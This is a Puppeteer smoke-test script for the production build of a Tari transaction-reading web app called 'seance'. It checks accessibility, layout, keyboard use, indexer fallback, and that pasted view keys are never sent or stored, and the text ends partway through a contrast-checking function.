// Browser smoke test of the PRODUCTION build (dist/), served under /seance/ to prove the relative base path works.
// It walks the judge path (10 s step: summon a transaction or paste an id; 60 s step: hold the seance, wrong key, own key),
// live and in recorded ("fixture") mode, and checks layout, tap targets, focus rings, keyboard use, reduced motion, contrast,
// axe and the CSP. Writes evidence/smoke.txt and screenshots evidence/seance-*.png.
//   npm run build && node scripts/smoke.mjs        (headless; no screen is used)
// The live parts call the real indexer about a dozen times in total. The recorded parts run in a browser where every outside
// host fails to resolve, so any request the page tried to make would show up as a failure.
import { randomBytes } from 'node:crypto'
import { existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, statSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import puppeteer from 'puppeteer-core'
import { EXPLORER_URL, INDEXER_URL, explorerTx } from '../src/config.ts'
import { tari } from '../src/format.ts'
import { serveDir } from './serve.mjs'

delete process.env.DISPLAY
const APP = new URL('..', import.meta.url).pathname
const DIST = join(APP, 'dist')
const EVID = join(APP, 'evidence')
const PORT = Number(process.env.SMOKE_PORT ?? 4273)
const OWN = `127.0.0.1:${PORT}`
const BASE = `http://${OWN}/seance/`
const INDEXER_HOST = new URL(INDEXER_URL).host
const ledger = JSON.parse(readFileSync(join(APP, 'ledger.json'), 'utf8'))
const keys = ledger.keys
const tx = (n) => ledger.txs[n - 1]
const UNKNOWN = 'ab'.repeat(32)
const QUIET = 'The spirits are quiet.'
const NO_KEY = 'Hand the medium a key and it will listen.'

const lines = []
let failed = 0
const say = (s) => {
  lines.push(s)
  console.log(s)
}
const check = (ok, what, detail = '') => {
  if (!ok) failed++
  say(`${ok ? 'ok  ' : 'FAIL'} ${what}${detail ? `  [${detail}]` : ''}`)
}
const section = (t) => say(`\n== ${t}`)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
const isHex64 = (s) => /^[0-9a-f]{64}$/.test(s ?? '')

// ---------- in-page probes (serialised into the page, so they may not use anything from this file) ----------
function snapshot() {
  const $ = (s) => document.querySelector(s)
  const body = $('#stranger-body')
  const status = $('#status').getBoundingClientRect()
  return {
    badge: $('#mode-badge').textContent,
    pressed: $('#mode-switch').getAttribute('aria-pressed'),
    modeText: $('#mode-text').textContent,
    status: $('#status').textContent,
    statusClass: $('#status').className,
    statusInView: status.top >= 0 && status.bottom <= innerHeight,
    txid: $('#txid').value,
    hash: location.hash,
    ownHint: $('#own-hint').textContent,
    source: body.querySelector('.source')?.textContent ?? null,
    shownId: body.querySelector('.fact code.hex')?.textContent ?? null,
    explorerHref: body.querySelector('.actions a')?.href ?? null,
    explorerRel: body.querySelector('.actions a')?.rel ?? null,
    explorerTarget: body.querySelector('.actions a')?.target ?? null,
    notes: body.querySelectorAll('details.note').length,
    notesOpen: body.querySelectorAll('details.note[open]').length,
    strangerEmpty: body.querySelector('.empty')?.textContent ?? null,
    strangerText: $('#stranger').innerText,
    strangerBody: [...body.children].filter((c) => !c.classList.contains('source')).map((c) => c.innerText).join('\n'),
    strangerTop: Math.round($('#stranger').getBoundingClientRect().top),
    checkedKey: $('input[name=key]:checked')?.value ?? null,
    quiet: $('#reading .quiet')?.textContent ?? null,
    empty: $('#reading .empty')?.textContent ?? null,
    readings: [...document.querySelectorAll('#reading .reading')].map((r) => ({ amount: r.querySelector('.amount').textContent, memo: r.querySelector('.memo').textContent })),
    readingText: $('#reading').innerText,
    scrollY: Math.round(scrollY),
  }
}

function layoutProbe() {
  const vw = document.documentElement.clientWidth
  const out = { vw, scrollW: document.documentElement.scrollWidth, over: [], clipped: [], small: [], targets: 0, cards: [] }
  const shown = (el) => {
    const r = el.getBoundingClientRect()
    const cs = getComputedStyle(el)
    return r.width > 0 && r.height > 0 && cs.visibility !== 'hidden' && cs.display !== 'none'
  }
  const name = (el) => el.tagName.toLowerCase() + (el.id ? `#${el.id}` : '') + (typeof el.className === 'string' && el.className.trim() ? `.${el.className.trim().split(/\s+/).join('.')}` : '')
  for (const el of document.body.querySelectorAll('*')) {
    if (el.closest('.sr-only, .skip') || !shown(el)) continue
    const r = el.getBoundingClientRect()
    if (r.right > vw + 1 || r.left < -1) out.over.push(`${name(el)} ${Math.round(r.left)}..${Math.round(r.right)}`)
    const cs = getComputedStyle(el)
    // a text field scrolls its content by design (a 64-character id in a narrow field is not clipped text), so inputs are skipped
    if (el.tagName !== 'INPUT' && (cs.overflowX === 'hidden' || cs.overflowX === 'clip') && el.scrollWidth > el.clientWidth + 1) out.clipped.push(`${name(el)} ${el.scrollWidth}>${el.clientWidth}`)
  }
  for (const el of document.querySelectorAll('a[href], button, input:not([type=hidden]), select, textarea, summary')) {
    if (!shown(el)) continue
    out.targets++
    const box = el.matches('input[type=radio], input[type=checkbox]') ? (el.closest('label') ?? el) : el
    const r = box.getBoundingClientRect()
    if (r.width < 44 || r.height < 44) out.small.push(`${name(el)} ${Math.round(r.width)}x${Math.round(r.height)}`)
  }
  out.cards = [...document.querySelectorAll('.lens')].map((c) => {
    const r = c.getBoundingClientRect()
    return { left: Math.round(r.left + scrollX), top: Math.round(r.top + scrollY), width: Math.round(r.width) }
  })
  return out
}

function focusProbe() {
  const el = document.activeElement
  window.__seen ??= new WeakSet()
  if (!el || el === document.body || el === document.documentElement) return { end: true }
  if (window.__seen.has(el)) return { wrapped: true }
  window.__seen.add(el)
  const cs = getComputedStyle(el)
  const r = el.getBoundingClientRect()
  const label = el.tagName === 'A' || el.tagName === 'SUMMARY' ? ` "${el.textContent.trim().slice(0, 24)}"` : ''
  return {
    name: el.tagName.toLowerCase() + (el.id ? `#${el.id}` : '') + (el.tagName === 'INPUT' && el.name === 'key' ? `[key=${el.value}]` : '') + label,
    style: cs.outlineStyle,
    width: parseFloat(cs.outlineWidth),
    color: cs.outlineColor,
    onScreen: r.width > 0 && r.height > 0 && r.bottom > 0 && r.top < innerHeight && r.right > 0 && r.left < innerWidth,
  }
}

// ---------- helpers ----------
async function until(page, fn, arg, ms = 15000) {
  const t0 = Date.now()
  for (;;) {
    const v = await page.evaluate(fn, arg)
    if (v) return v
    if (Date.now() - t0 > ms) throw new Error(`timed out after ${ms} ms waiting for: ${fn.toString().replace(/\s+/g, ' ').slice(0, 90)}`)
    await sleep(100)
  }
}
const settled = (page, ms = 30000) => until(page, () => document.getElementById('stranger-body').getAttribute('aria-busy') !== 'true', undefined, ms)
const snap = (page) => page.evaluate(snapshot)
const armReading = (page) =>
  page.evaluate(() => {
    window.__r = 0
    window.__ro?.disconnect()
    window.__ro = new MutationObserver(() => window.__r++)
    window.__ro.observe(document.getElementById('reading'), { childList: true, subtree: true })
  })
async function heard(page) {
  await until(page, () => window.__r > 0, undefined, 5000)
  await sleep(150)
  return snap(page)
}
async function scrollSettled(page) {
  let last = -1
  for (let i = 0; i < 30; i++) {
    const y = await page.evaluate(() => Math.round(scrollY))
    if (y === last) return y
    last = y
    await sleep(150)
  }
  return last
}
const externalHosts = (log) => [...new Set(log.requests.map((r) => r.url).filter((u) => /^https?:/.test(u)).map((u) => new URL(u).host))].filter((h) => h !== OWN)
const consoleBad = (log) => log.console.filter((m) => m.type === 'error' || m.type === 'warning')
// the 0.9 s fade-in must be over, or the screenshot catches a reading half blurred
const shot = async (page, name, opts = {}) => {
  await sleep(1100)
  return page.screenshot({ path: join(EVID, name), type: 'png', ...opts })
}
const seeLenses = (page) => page.evaluate(() => document.querySelector('.lensed').scrollIntoView())

async function open(browser, { w, h = 800, url = BASE, reduce = false, intercept = null }) {
  const page = await browser.newPage()
  const mobile = w < 700
  await page.setViewport({ width: w, height: h, deviceScaleFactor: 1, isMobile: mobile, hasTouch: mobile })
  if (reduce) await page.emulateMediaFeatures([{ name: 'prefers-reduced-motion', value: 'reduce' }])
  const log = { console: [], pageErrors: [], requests: [], failed: [] }
  page.on('console', (m) => log.console.push({ type: m.type(), text: m.text(), url: m.location()?.url ?? '' }))
  page.on('pageerror', (e) => log.pageErrors.push(String(e)))
  page.on('request', (r) => log.requests.push({ url: r.url(), post: r.postData() ?? '', headers: JSON.stringify(r.headers()) }))
  page.on('requestfailed', (r) => log.failed.push(`${r.url()} ${r.failure()?.errorText}`))
  if (intercept) {
    await page.setRequestInterception(true)
    page.on('request', intercept)
  }
  await page.goto(url, { waitUntil: 'load' })
  await until(page, () => document.querySelectorAll('#demo option').length > 0, undefined, 20000) // the app has started (wasm included)
  return { page, log }
}

let axeSource = null
async function axe(page, label) {
  axeSource ??= readFileSync(join(APP, 'node_modules/axe-core/axe.min.js'), 'utf8')
  await sleep(1100) // the 0.9 s fade-in must finish: contrast is measured on settled colours
  if (!(await page.evaluate(() => !!window.axe))) await page.evaluate(axeSource) // evaluated over the debugging protocol, so the page's CSP does not apply
  const r = await page.evaluate(async () => {
    const res = await window.axe.run(document, { runOnly: { type: 'tag', values: ['wcag2a', 'wcag2aa', 'wcag21a', 'wcag21aa', 'wcag22aa', 'best-practice'] } })
    return {
      violations: res.violations.map((v) => ({ id: v.id, impact: v.impact, nodes: v.nodes.length, targets: v.nodes.slice(0, 3).map((n) => n.target.join(' ')) })),
      incomplete: res.incomplete.map((v) => `${v.id} x${v.nodes.length}`),
      passes: res.passes.length,
    }
  })
  check(r.violations.length === 0, `axe ${label}: 0 violations`, r.violations.length ? JSON.stringify(r.violations) : `${r.passes} rules passed; needs-review: ${r.incomplete.join(', ') || 'none'}`)
}

async function layout(page, label, { wide }) {
  await page.evaluate(() => scrollTo(0, 0)) // the Medium card is sticky: measure the cards where they start
  const r = await page.evaluate(layoutProbe)
  check(r.scrollW <= r.vw, `${label}: no horizontal scroll`, `${r.scrollW} <= ${r.vw}`)
  check(r.over.length === 0, `${label}: nothing sticks out of the viewport`, r.over.slice(0, 5).join('; '))
  check(r.clipped.length === 0, `${label}: no clipped text`, r.clipped.slice(0, 5).join('; '))
  check(r.small.length === 0, `${label}: all ${r.targets} tap targets are at least 44x44 px`, r.small.slice(0, 6).join('; '))
  const [a, b, c] = r.cards
  const side = a.top === b.top && b.top === c.top && a.left < b.left && b.left < c.left
  const stacked = a.left === b.left && b.left === c.left && a.top < b.top && b.top < c.top
  check(wide ? side : stacked, `${label}: the three lens cards are ${wide ? 'side by side' : 'stacked'}`, r.cards.map((x) => `${x.left},${x.top} w${x.width}`).join(' | '))
}

async function tabThrough(page, label) {
  await page.evaluate(() => {
    document.activeElement?.blur()
    // Chrome continues Tab from the last click or scroll position, not from the top: focusing the body (briefly focusable) starts it at the top
    document.body.tabIndex = -1
    document.body.focus()
    document.body.removeAttribute('tabindex')
    window.__seen = new WeakSet()
    scrollTo(0, 0)
  })
  const stops = []
  for (let i = 0; i < 150; i++) {
    await page.keyboard.press('Tab')
    const s = await page.evaluate(focusProbe)
    if (s.end || s.wrapped) break
    stops.push(s)
  }
  const bad = stops.filter((s) => s.style !== 'solid' || s.width < 2 || !s.onScreen || s.color !== 'rgb(255, 224, 138)')
  check(stops.length >= 10 && bad.length === 0, `${label}: all ${stops.length} Tab stops show the yellow 3 px outline and are on screen`, bad.map((s) => `${s.name} ${s.style} ${s.width} ${s.color} ${s.onScreen}`).join('; '))
  const order = ['a "Skip', 'input#txid', 'button#look', 'button#summon', 'select#demo', 'button#hold', 'button#mode-switch', 'a "Open in the explorer', 'input[key=', 'input#own-key', 'a "Tari Ootle explorer', 'a "Tari Ootle docs']
  const at = order.map((o) => stops.findIndex((s) => s.name.startsWith(o)))
  check(at.every((i, k) => i >= 0 && (k === 0 || i > at[k - 1])), `${label}: Tab order follows the page: skip link, id field, buttons, mode switch, explorer link, keys, own key, footer`, order.map((o, k) => `${o}=${at[k]}`).join(' '))
  return stops
}

function expectHeard(s, t, keyName, label) {
  const want = t.expected.outputs.filter((o) => o.reader === keyName).map((o) => ({ amount: tari(o.value), memo: o.memo ? `“${o.memo}”` : 'No memo' }))
  if (want.length === 0) check(s.quiet === QUIET && s.readings.length === 0, `${label}: silence ("${QUIET}"), no amount shown`, s.quiet ? '' : s.readingText.slice(0, 80))
  else check(s.quiet === null && JSON.stringify(s.readings) === JSON.stringify(want), `${label}: reads ${want.map((w) => `${w.amount} ${w.memo}`).join(' + ')}`, JSON.stringify(s.readings))
}

// ---------- the judge path ----------
const liveBodies = new Map() // id -> stranger text from a live run, compared with the recorded run

async function walk(browser, { mode, w }) {
  const live = mode === 'live'
  const tag = `${mode} ${w}px`
  const { page, log } = await open(browser, { w })
  const wide = w >= 960
  const H = 800 // the viewport height open() uses
  // wide: the Stranger card starts in the upper half of the screen; one column: the page scrolled it to the top
  const inView = (x) => (wide ? x.strangerTop >= 0 && x.strangerTop <= H / 2 : Math.abs(x.strangerTop) <= 24)
  let s = await snap(page)
  check(externalHosts(log).length === 0 && log.requests.every((r) => new URL(r.url).pathname.startsWith('/seance/')), `${tag}: loading the page asks nobody but its own server (all paths under /seance/)`, `${log.requests.length} requests`)
  check(s.badge === 'Live' && s.pressed === 'false' && s.strangerEmpty?.startsWith('Nothing on the table') && s.empty === 'The medium waits for a transaction. Call one up above.', `${tag}: first view is the empty seance in live mode`)
  check(await page.evaluate(() => document.querySelectorAll('#demo option').length === 11 && document.querySelectorAll('input[name=key]').length === 3 && /coming next/i.test(document.querySelector('.lens.auditor').innerText)), `${tag}: 11 demos, 3 demo keys, the Auditor is labelled "Coming next"`)
  await layout(page, `${tag} landing`, { wide })
  if (live) await shot(page, `seance-${w}-live-landing.png`)
  await axe(page, `${tag} landing`)

  if (!live) {
    await page.click('#mode-switch')
    s = await snap(page)
    check(s.badge === 'Recorded' && s.pressed === 'true' && s.status === 'Switched to recorded data. Nothing will be asked of the indexer.', `${tag}: the manual switch turns recorded mode on and says so`)
    await shot(page, `seance-${w}-recorded-landing.png`)
    await axe(page, `${tag} landing after the switch`)
  }

  // 10 seconds: summon a recent transaction
  const t0 = Date.now()
  await page.click('#summon')
  await settled(page)
  const ms = Date.now() - t0
  await scrollSettled(page)
  s = await snap(page)
  const quiet = live && /^Recorded:/.test(s.source ?? '')
  check(isHex64(s.shownId) && s.txid === s.shownId && s.hash === `#tx=${s.shownId}`, `${tag}: "Summon" shows a transaction id (${s.shownId?.slice(0, 10)}...), in the id field and the address`)
  check(live ? /^Live:/.test(s.source ?? '') || quiet : /^Recorded:/.test(s.source ?? ''), `${tag}: the Stranger says where the data came from`, `${s.source}${quiet ? ' (quiet chain)' : ''}`)
  check(ms < 10000, `${tag}: the 10 s step took ${ms} ms`)
  check(s.explorerHref === explorerTx(s.shownId) && s.explorerTarget === '_blank' && /noopener/.test(s.explorerRel ?? ''), `${tag}: the explorer link points at this very id and opens safely`)
  check(s.notes >= 1 && s.notesOpen === (wide ? s.notes : 0), `${tag}: sealed notes are ${wide ? 'open' : 'closed'} by default (${s.notes})`)
  check(s.empty === NO_KEY, `${tag}: with no key chosen the Medium waits ("${NO_KEY}")`)
  check(inView(s), `${tag}: the answer is on screen without scrolling by hand: the Stranger card ${wide ? 'starts in the upper half' : 'was scrolled to the top'}`, `top ${s.strangerTop}px of ${H}px, scrollY ${s.scrollY}`)

  // 10 seconds, other way: paste an id
  await page.$eval('#txid', (el) => el.select())
  await page.keyboard.sendCharacter(tx(3).id)
  await page.click('#look')
  await settled(page)
  s = await snap(page)
  check(s.shownId === tx(3).id && s.explorerHref === explorerTx(tx(3).id), `${tag}: a pasted id shows that transaction, with its explorer link`)

  // 60 seconds: hold the seance on a demo
  await page.select('#demo', tx(1).id)
  await armReading(page)
  await page.click('#hold')
  await settled(page)
  await scrollSettled(page)
  s = await snap(page)
  check(s.shownId === tx(1).id && s.checkedKey === 'bob' && s.explorerHref === explorerTx(tx(1).id), `${tag}: "Hold the seance" shows demo 1, picks Bob's key, links to the explorer`)
  expectHeard(s, tx(1), 'bob', `${tag}: Bob's key on demo 1`)
  check(!s.strangerText.includes(tx(1).memo) && !s.strangerText.includes(tari(tx(1).amount)), `${tag}: the Stranger's card shows neither the memo nor the amount`)
  check(/Read inside this page with Bob's key\. Nothing was sent anywhere\./.test(s.readingText), `${tag}: the Medium says it listened locally`)
  check(inView(s), `${tag}: after "Hold the seance" the answer is on screen without scrolling by hand`, `top ${s.strangerTop}px of ${H}px`)
  if (live) liveBodies.set(`${w}:${tx(1).id}`, s.strangerBody)
  else if (liveBodies.has(`${w}:${tx(1).id}`)) check(liveBodies.get(`${w}:${tx(1).id}`) === s.strangerBody, `${tag}: the Stranger's card for demo 1 is word for word the same as in the live run`)
  await seeLenses(page)
  await shot(page, `seance-${w}-${mode}-bob.png`)
  if (wide) await shot(page, `seance-${w}-${mode}-bob-full.png`, { fullPage: true })

  // the wrong key, the other key
  for (const name of ['eve', 'carol', 'bob']) {
    await armReading(page)
    await page.click(`input[name=key][value="${name}"]`)
    s = await heard(page)
    expectHeard(s, tx(1), name, `${tag}: ${name}'s key on demo 1`)
    if (name === 'eve') {
      // side by side: the three cards from their heading; one column: the end of the Medium card, where its answer is
      if (wide) await seeLenses(page)
      else await page.evaluate(() => document.querySelector('.lens.medium').scrollIntoView({ block: 'end' }))
      await shot(page, `seance-${w}-${mode}-silence.png`)
    }
  }

  // own key: never leaves the page
  const own = '#own-key'
  const typeKey = async (value) => {
    await armReading(page)
    await page.$eval(own, (el) => el.select())
    if (value === '') await page.keyboard.press('Backspace')
    else await page.keyboard.sendCharacter(value)
    return heard(page)
  }
  s = await typeKey(keys.bob.viewSecret)
  expectHeard(s, tx(1), 'bob', `${tag}: pasting Bob's secret into the own-key field`)
  check(s.checkedKey === null && /with your key/.test(s.readingText), `${tag}: a pasted key unchecks the demo keys and is called "your key"`)
  const stranger = randomBytes(32).toString('hex')
  s = await typeKey(stranger)
  expectHeard(s, tx(1), 'nobody', `${tag}: a random pasted key`)
  s = await typeKey('not a key')
  check(/A view secret is 64 hexadecimal characters/.test(s.ownHint) && s.empty === NO_KEY && s.readings.length === 0, `${tag}: a malformed key gets a hint and no reading`, s.ownHint)
  s = await typeKey('')
  check(s.ownHint === '' && s.empty === NO_KEY, `${tag}: clearing the field clears the hint`)
  await typeKey(keys.bob.viewSecret)
  const probe = await page.evaluate((secret) => ({ href: location.href, storage: JSON.stringify(localStorage) + JSON.stringify(sessionStorage), cookie: document.cookie, state: JSON.stringify(history.state), body: document.body.innerText.includes(secret) }), keys.bob.viewSecret)
  const sent = log.requests.filter((r) => [r.url, r.post, r.headers].some((x) => x.includes(keys.bob.viewSecret) || x.includes(keys.bob.viewSecret.slice(0, 16)) || x.includes(stranger.slice(0, 16)))).length
  check(sent === 0, `${tag}: no request carried the pasted keys (${log.requests.length} requests checked: URL, headers, body)`)
  check(!probe.href.includes(keys.bob.viewSecret) && !probe.storage.includes(keys.bob.viewSecret) && !probe.cookie.includes(keys.bob.viewSecret) && !probe.state.includes(keys.bob.viewSecret) && !probe.body, `${tag}: the pasted key is not in the address, storage, cookies, history or page text`)

  // a revealed amount: nothing sealed to read
  await page.select('#demo', tx(11).id)
  await armReading(page)
  await page.click('#hold')
  await settled(page)
  s = await heard(page)
  check(s.shownId === tx(11).id && /revealed the amount on purpose/.test(s.status), `${tag}: the revealed-amount demo says so`)
  expectHeard(s, tx(11), 'bob', `${tag}: Bob's key on demo 11 (amount revealed)`)

  // more demos
  const more = live ? (w === 1280 ? [7] : []) : [2, 3, 4, 5, 6, 7, 8, 9, 10]
  for (const n of more) {
    await page.select('#demo', tx(n).id)
    await armReading(page)
    await page.click('#hold')
    await settled(page)
    s = await heard(page)
    check(s.shownId === tx(n).id && s.checkedKey === tx(n).to, `${tag}: demo ${n} shows its id and picks ${tx(n).to}'s key`)
    expectHeard(s, tx(n), tx(n).to, `${tag}: demo ${n} read by ${tx(n).to}`)
  }
  if (!live) {
    const was = s.badge
    check(was === 'Recorded', `${tag}: the page stayed in recorded mode throughout`)
    await page.$eval('#txid', (el) => el.select())
    await page.keyboard.sendCharacter(UNKNOWN)
    await page.click('#look')
    await settled(page)
    s = await snap(page)
    check(/^Recorded mode only knows the demo transactions/.test(s.status) && /error/.test(s.statusClass) && s.badge === 'Recorded', `${tag}: an unknown id says "recorded mode only knows the demos" and stays recorded`)
  }
  const before = log.requests.length
  await page.$eval('#txid', (el) => el.select())
  await page.keyboard.sendCharacter('abc')
  await page.click('#look')
  await settled(page)
  s = await snap(page)
  check(/^A transaction id is 64 hexadecimal characters/.test(s.status) && /error/.test(s.statusClass) && log.requests.length === before, `${tag}: a malformed id is refused without a request`)
  check(s.statusInView, `${tag}: the page brings the error message into view`)

  // the judge path is done: nothing may have gone wrong in the console
  const bad = consoleBad(log)
  check(bad.length === 0 && log.pageErrors.length === 0, `${tag}: 0 console errors or warnings, 0 page errors over the whole walk`, bad.map((m) => m.text).concat(log.pageErrors).slice(0, 3).join(' | '))
  const hosts = externalHosts(log)
  if (live) check(hosts.every((h) => h === INDEXER_HOST), `${tag}: the only outside host contacted is the indexer`, hosts.join(', '))
  else check(hosts.length === 0 && log.failed.length === 0, `${tag}: no outside request was even attempted, none failed`, `${hosts.join(', ')} ${log.failed.slice(0, 2).join(' | ')}`)

  // layout, accessibility and keyboard in a full state
  await armReading(page)
  await page.select('#demo', tx(1).id)
  await page.click('#hold')
  await settled(page)
  await heard(page)
  await layout(page, `${tag} loaded`, { wide })
  await axe(page, `${tag} loaded (Bob reads demo 1)`)
  if (!wide) {
    await page.evaluate(() => document.querySelectorAll('#stranger details').forEach((d) => (d.open = true)))
    await layout(page, `${tag} with every note and ciphertext opened`, { wide })
    await axe(page, `${tag} with every note and ciphertext opened`)
    await page.evaluate(() => document.querySelector('#stranger details.note').scrollIntoView())
    await shot(page, `seance-${w}-${mode}-note-open.png`)
  }
  await tabThrough(page, `${tag}`)
  if (live) {
    // unknown id against the real indexer: must be a clean "not found", not a switch to recorded data
    const quietBefore = consoleBad(log).length
    await page.$eval('#txid', (el) => el.select())
    await page.keyboard.sendCharacter(UNKNOWN)
    await page.click('#look')
    await settled(page)
    s = await snap(page)
    check(s.status === 'The indexer does not know this transaction id on Esmeralda.' && /error/.test(s.statusClass) && s.badge === 'Live', `${tag}: an unknown id gives "not found" from the real indexer and the page stays live`, `${s.badge}: ${s.status}`)
    const extra = consoleBad(log).slice(quietBefore)
    check(extra.every((m) => /404/.test(m.text) && m.url.startsWith(INDEXER_URL)), `${tag}: the only console line it caused is the browser's own note about the indexer's 404`, extra.map((m) => m.text).join(' | ') || 'none')
    await page.$eval('#txid', (el) => el.select())
    await page.keyboard.sendCharacter(tx(3).id)
    await page.click('#look')
    await settled(page)
    s = await snap(page)
    check(s.shownId === tx(3).id && s.badge === 'Live' && /^Live:/.test(s.source), `${tag}: after "not found" the next lookup still works, live`)
  }
  await page.close()
}

// ---------- the indexer goes away ----------
async function fallbackRun(browser, w) {
  const tag = `auto-fallback ${w}px`
  const { page, log } = await open(browser, { w, url: `${BASE}#tx=${tx(2).id}` })
  await settled(page)
  let s = await snap(page)
  const asked = () => log.requests.filter((r) => new URL(r.url).host === INDEXER_HOST).length
  check(s.badge === 'Recorded' && s.pressed === 'true' && /^The indexer did not answer, so the page switched to recorded data\./.test(s.status) && /warn/.test(s.statusClass), `${tag}: with the indexer unreachable the page switches to recorded by itself and says so`, s.status)
  check(s.shownId === tx(2).id && /^Recorded:/.test(s.source), `${tag}: the id from the address still shows, marked "Recorded"`)
  check(asked() === 1, `${tag}: the indexer was asked once (the first try), then left alone`, `${asked()} requests`)
  await armReading(page)
  await page.click('input[name=key][value="carol"]')
  s = await heard(page)
  expectHeard(s, tx(2), 'carol', `${tag}: Carol's key reads demo 2 from the recording`)
  await page.select('#demo', tx(1).id)
  await page.click('#hold')
  await settled(page)
  s = await snap(page)
  check(s.shownId === tx(1).id && asked() === 1, `${tag}: further lookups are answered from the recording without asking again`, `${asked()} requests`)
  const bad = consoleBad(log).filter((m) => !(m.type === 'error' && m.url.startsWith(INDEXER_URL) && /Failed to load resource/.test(m.text)))
  check(bad.length === 0 && log.pageErrors.length === 0, `${tag}: no console error except the browser's own note that the indexer request failed`, bad.map((m) => m.text).concat(log.pageErrors).join(' | '))
  await page.click('#mode-switch')
  s = await snap(page)
  check(s.badge === 'Live' && s.pressed === 'false', `${tag}: the way back to live is one click`)
  await page.close()
}

async function hangRun(browser) {
  const tag = 'auto-fallback (indexer never answers)'
  let held = 0
  const intercept = (r) => {
    if (new URL(r.url()).host === INDEXER_HOST) held++ // never answered, never aborted
    else void r.continue()
  }
  const { page } = await open(browser, { w: 1280, intercept })
  await page.click('#summon')
  const t0 = Date.now()
  await settled(page, 40000)
  const ms = Date.now() - t0
  const s = await snap(page)
  check(held === 1 && s.badge === 'Recorded' && /^The indexer did not answer/.test(s.status), `${tag}: the page gives up and switches to recorded`, `after ${ms} ms, ${held} request held`)
  check(ms >= 7500 && ms < 12000, `${tag}: the wait is about the 8 s timeout`, `${ms} ms`)
  await page.close()
}

// ---------- keyboard only ----------
async function keyboardRun(browser) {
  const tag = 'keyboard 1280px'
  const { page } = await open(browser, { w: 1280 })
  const active = () => page.evaluate(() => document.activeElement?.id || document.activeElement?.tagName)
  const press = async (key, n = 1) => {
    for (let i = 0; i < n; i++) await page.keyboard.press(key)
  }
  await press('Tab')
  check((await page.evaluate(() => document.activeElement.className)) === 'skip', `${tag}: the first Tab lands on the skip link`)
  await press('Enter')
  await press('Tab')
  check((await active()) === 'txid', `${tag}: Enter on the skip link, then Tab, lands in the id field`, await active())
  await press('Tab', 5)
  check((await active()) === 'mode-switch', `${tag}: five more Tabs reach the mode switch (look, summon, demo, hold, switch)`, await active())
  await press('Space')
  let s = await snap(page)
  check(s.badge === 'Recorded' && s.pressed === 'true', `${tag}: Space on the mode switch turns recorded mode on`)
  await page.keyboard.down('Shift')
  await press('Tab', 5)
  await page.keyboard.up('Shift')
  check((await active()) === 'txid', `${tag}: Shift+Tab walks back to the id field`, await active())
  await page.keyboard.type(tx(5).id)
  await press('Enter')
  await settled(page)
  s = await snap(page)
  check(s.shownId === tx(5).id, `${tag}: typing an id and pressing Enter shows it`)
  await press('Tab', 3)
  check((await active()) === 'demo', `${tag}: Tab, Tab, Tab reaches the demo list`, await active())
  await press('ArrowDown')
  check((await page.evaluate(() => document.getElementById('demo').selectedIndex)) === 1, `${tag}: the arrow key picks the next demo`)
  await press('Tab')
  await armReading(page)
  await press('Enter')
  await settled(page)
  s = await heard(page)
  check(s.shownId === tx(2).id && s.checkedKey === 'carol' && (await active()) === 'hold', `${tag}: Enter on "Hold the seance" loads demo 2 and focus stays on the button`, await active())
  expectHeard(s, tx(2), 'carol', `${tag}: Carol's key on demo 2`)
  await page.focus('input[name=key]:checked')
  await armReading(page)
  await press('ArrowDown')
  s = await heard(page)
  check(s.checkedKey === 'eve', `${tag}: the arrow keys move through the keys (carol to eve)`)
  expectHeard(s, tx(2), 'eve', `${tag}: Eve's key on demo 2 by keyboard`)
  await page.focus('#summon')
  await press('Space')
  await settled(page)
  s = await snap(page)
  check(isHex64(s.shownId) && /^Recorded:/.test(s.source) && (await active()) === 'summon', `${tag}: Space on "Summon" works in recorded mode and keeps focus`)
  await page.close()
}

// ---------- reduced motion ----------
async function motionRun(browser) {
  const anim = (page) => page.evaluate(() => ({ flame: getComputedStyle(document.querySelector('.spirit .flame')).animationName, scroll: getComputedStyle(document.documentElement).scrollBehavior }))
  const probeReading = async (page) => {
    await page.select('#demo', tx(1).id)
    await page.click('#hold')
    await settled(page)
    return page.evaluate(() => getComputedStyle(document.querySelector('#reading .reading')).animationName)
  }
  const normal = await open(browser, { w: 1280 })
  await normal.page.click('#mode-switch')
  const n1 = await anim(normal.page)
  const n2 = await probeReading(normal.page)
  check(n1.flame === 'flicker' && n2 === 'rise', 'motion: by default the flame flickers and a reading fades in (control)', `${n1.flame}, ${n2}`)
  await normal.page.close()
  const calm = await open(browser, { w: 390, reduce: true })
  await calm.page.click('#mode-switch')
  const c1 = await anim(calm.page)
  const c2 = await probeReading(calm.page)
  check(c1.flame === 'none' && c2 === 'none' && c1.scroll === 'auto', 'motion: with prefers-reduced-motion the flame is still, readings do not fade in, scrolling is instant', `${c1.flame}, ${c2}, ${c1.scroll}`)
  const y1 = await scrollSettled(calm.page)
  const s = await snap(calm.page)
  check(Math.abs(s.strangerTop) <= 24, 'motion: reduced motion still scrolls to the answer on a phone', `top ${s.strangerTop}px, scrollY ${y1}`)
  await calm.page.close()
}

// ---------- contrast of the palette ----------
function lum(hex) {
  const c = [1, 3, 5].map((i) => parseInt(hex.slice(i, i + 2), 16) / 255).map((v) => (v <= 0.03928 ? v / 12.92 : ((v + 0.055) / 1.055) ** 2.4))
  return 0.2126 * c[0] + 0.7152 * c[1] + 0.0722 * c[2]
}
const ratio = (a, b) => {
  const [x, y] = [lum(a), lum(b)].sort((p, q) => q - p)
  return (x + 0.05) / (y + 0.05)
}
async function paletteChecks(browser) {
  const { page } = await open(browser, { w: 1280 })
  const v = await page.evaluate(() => Object.fromEntries(['--bg', '--card', '--card-2', '--well', '--text', '--muted', '--violet', '--amber', '--amber-ink', '--mint', '--rose', '--focus', '--control', '--line'].map((n) => [n, getComputedStyle(document.documentElement).getPropertyValue(n).trim()])))
  await page.close()
  const text = [
    ['--text', '--bg'], ['--text', '--card'], ['--text', '--card-2'], ['--text', '--well'],
    ['--muted', '--bg'], ['--muted', '--card'], ['--muted', '--card-2'], ['--muted', '--well'],
    ['--violet', '--bg'], ['--violet', '--card'], ['--violet', '--card-2'],
    ['--amber', '--bg'], ['--amber', '--card'], ['--amber', '--card-2'], ['--amber-ink', '--amber'], ['--amber-ink', '#ffc477'],
    ['--rose', '--card'], ['--rose', '--bg'], ['--mint', '--card'], ['--mint', '#12332a'], ['--amber', '#3a2a10'], ['--violet', '#2a2250'],
    ['#9a92b4', '--well'], ['#e4defa', '--well'],
  ]
  const val = (x) => (x.startsWith('#') ? x : v[x])
